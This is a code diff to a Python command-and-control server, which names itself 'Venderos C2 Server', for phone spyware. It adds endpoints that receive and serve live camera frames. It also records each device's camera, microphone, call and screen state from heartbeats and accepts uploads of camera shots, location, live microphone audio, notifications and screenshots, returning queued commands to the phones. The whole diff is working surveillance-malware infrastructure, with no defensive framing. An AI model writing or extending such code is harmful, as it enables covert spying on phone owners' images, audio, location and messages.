@@ -22,6 +22,9 @@ PORT = int(os.environ.get("MON_PORT", "8080"))
 
 os.makedirs(DATA_DIR, exist_ok=True)
 
+LIVE_FRAMES = {}
+LIVE_FRAMES_LOCK = Lock()
+
 class DeviceManager:
     def __init__(self, filepath: str):
         self.filepath = filepath
@@ -46,7 +49,8 @@ class DeviceManager:
         except Exception:
             pass
 
-    def update_heartbeat(self, dev_id: str, model: str, battery: str, app: str, ip: str) -> list:
+    def update_heartbeat(self, dev_id: str, model: str, battery: str, app: str, ip: str,
+                         cam: str = "?", mic: str = "?", call: str = "?", screen: str = "?", charge: str = "?") -> list:
         now_ts = time.time()
         now_iso = datetime.now(timezone.utc).isoformat()
         with self.lock:
@@ -54,13 +58,23 @@ class DeviceManager:
                 self.devices[dev_id] = {
                     "id": dev_id,
                     "first_seen": now_iso,
-                    "queue": []
+                    "queue": [],
+                    "cam": "?",
+                    "mic": "?",
+                    "call": "?",
+                    "screen": "?",
+                    "charge": "?"
                 }
             dev = self.devices[dev_id]
             dev["model"] = model or dev.get("model", "Unknown")
             dev["battery"] = battery or dev.get("battery", "-1")
             dev["app"] = app or dev.get("app", "")
             dev["ip"] = ip
+            dev["cam"] = cam or dev.get("cam", "?")
+            dev["mic"] = mic or dev.get("mic", "?")
+            dev["call"] = call or dev.get("call", "?")
+            dev["screen"] = screen or dev.get("screen", "?")
+            dev["charge"] = charge or dev.get("charge", "?")
             dev["last_seen"] = now_iso
             dev["last_seen_ts"] = now_ts
 
@@ -112,6 +126,11 @@ class DeviceManager:
                     "battery": dev.get("battery", "-1"),
                     "app": dev.get("app", ""),
                     "ip": dev.get("ip", ""),
+                    "cam": dev.get("cam", "?"),
+                    "mic": dev.get("mic", "?"),
+                    "call": dev.get("call", "?"),
+                    "screen": dev.get("screen", "?"),
+                    "charge": dev.get("charge", "?"),
                     "first_seen": dev.get("first_seen", ""),
                     "last_seen": dev.get("last_seen", ""),
                     "last_seen_ts": last_seen_ts,
@@ -878,6 +897,21 @@ class ReceiverHandler(BaseHTTPRequestHandler):
             self.send_resp(HTTPStatus.OK, DASHBOARD_HTML.encode("utf-8"), "text/html; charset=utf-8")
             return
 
+        if path == "/api/live/frame":
+            if not self.check_auth():
+                self.send_resp(HTTPStatus.UNAUTHORIZED, b'{"error":"unauthorized"}', "application/json")
+                return
+            qs = parse_qs(parsed.query)
+            dev = qs.get("dev", [""])[0].strip()
+            kind = qs.get("kind", ["cam"])[0].strip()
+            with LIVE_FRAMES_LOCK:
+                buf = LIVE_FRAMES.get((dev, kind))
+            if not buf:
+                self.send_resp(HTTPStatus.NOT_FOUND, b"frame not found\n")
+                return
+            self.send_resp(HTTPStatus.OK, buf, "image/jpeg")
+            return
+
         if path == "/api/devices":
             if not self.check_auth():
                 self.send_resp(HTTPStatus.UNAUTHORIZED, b'{"error":"unauthorized"}', "application/json")
@@ -968,6 +1002,29 @@ class ReceiverHandler(BaseHTTPRequestHandler):
         parsed = urlparse(self.path)
         path = parsed.path
 
+        if path == "/api/live/frame":
+            if not self.check_auth():
+                self.send_resp(HTTPStatus.UNAUTHORIZED, b'{"error":"unauthorized"}\n', "application/json")
+                return
+            dev_id = self.headers.get("X-Device-Id", "").strip()
+            kind = self.headers.get("X-Live-Kind", "cam").strip() or "cam"
+            if not dev_id:
+                self.send_resp(HTTPStatus.BAD_REQUEST, b'{"error":"missing device id"}\n', "application/json")
+                return
+            try:
+                length = int(self.headers.get("Content-Length", 0))
+            except ValueError:
+                length = 0
+            if length <= 0 or length > MAX_BODY_SIZE:
+                self.send_resp(HTTPStatus.REQUEST_ENTITY_TOO_LARGE, b"invalid frame size\n")
+                return
+            body = self.rfile.read(length)
+            with LIVE_FRAMES_LOCK:
+                LIVE_FRAMES[(dev_id, kind)] = body
+            self.send_response(HTTPStatus.NO_CONTENT)
+            self.end_headers()
+            return
+
         if path == "/poll":
             if not self.check_auth():
                 self.send_resp(HTTPStatus.UNAUTHORIZED, b'{"error":"unauthorized"}\n', "application/json")
@@ -981,9 +1038,14 @@ class ReceiverHandler(BaseHTTPRequestHandler):
             model = self.headers.get("X-Device-Model", "").strip()
             battery = self.headers.get("X-Device-Battery", "").strip()
             app = self.headers.get("X-Device-App", "").strip()
+            cam = self.headers.get("X-Device-Cam", "?").strip() or "?"
+            mic = self.headers.get("X-Device-Mic", "?").strip() or "?"
+            call = self.headers.get("X-Device-Call", "?").strip() or "?"
+            screen = self.headers.get("X-Device-Screen", "?").strip() or "?"
+            charge = self.headers.get("X-Device-Charge", "?").strip() or "?"
             ip = self.get_client_ip()
 
-            cmds = device_mgr.update_heartbeat(dev_id, model, battery, app, ip)
+            cmds = device_mgr.update_heartbeat(dev_id, model, battery, app, ip, cam, mic, call, screen, charge)
             resp = json.dumps({"status": "ok", "commands": cmds})
             self.send_resp(HTTPStatus.OK, resp.encode("utf-8"), "application/json")
             return
@@ -1078,6 +1140,10 @@ class ReceiverHandler(BaseHTTPRequestHandler):
                 self.send_resp(HTTPStatus.BAD_REQUEST, b"missing kind or f\n")
                 return
 
+            if kind not in ("cam", "camfront", "loc", "mic", "miclive", "notif", "scr"):
+                self.send_resp(HTTPStatus.BAD_REQUEST, b"unsupported kind\n")
+                return
+
             dev_id = self.headers.get("X-Device-Id", "").strip() or body_dev or "unknown"
             safe_dev = re.sub(r"[^a-zA-Z0-9_\-]", "", dev_id) or "unknown"
             safe_kind = re.sub(r"[^a-zA-Z0-9_\-]", "", kind) or "misc"
@@ -1110,6 +1176,12 @@ class ReceiverHandler(BaseHTTPRequestHandler):
             return
 
         self.send_resp(HTTPStatus.NOT_FOUND, b"not found\n")
+
+try:
+    import live
+    live.attach(ReceiverHandler)
+except ImportError:
+    pass
 
 def run():
     print(f"[*] Venderos C2 Server listening on 127.0.0.1:{PORT} (Press Ctrl+C to stop)", flush=True)
